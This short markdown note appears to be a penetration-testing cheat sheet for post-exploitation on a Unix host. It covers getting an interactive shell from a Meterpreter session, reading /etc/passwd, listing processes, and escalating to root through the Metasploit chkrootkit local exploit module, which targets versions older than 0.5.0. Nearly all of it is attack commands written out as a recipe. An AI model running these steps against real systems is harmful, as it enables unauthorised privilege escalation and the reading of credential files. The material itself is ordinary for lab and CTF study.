# Exploitating a vulnerable program
get a shell on the target from meterpreter
1. ```shell```
2. ```/bin/bash -i```
3. ```cat /etc/passwd```
4. search for processes -- ```ps aux```

**chrootkit**  
Versions older than 0.5.0 are vulnerable  
enumerate version --```chkrootkit -V```

Module: **exploit/unix/local/chkrootkit**  
 - set chkrootkit /bin/chkrootkit
 - set LHOST
 - run
 - ```/bin/bash -i``` and you should have root privileges
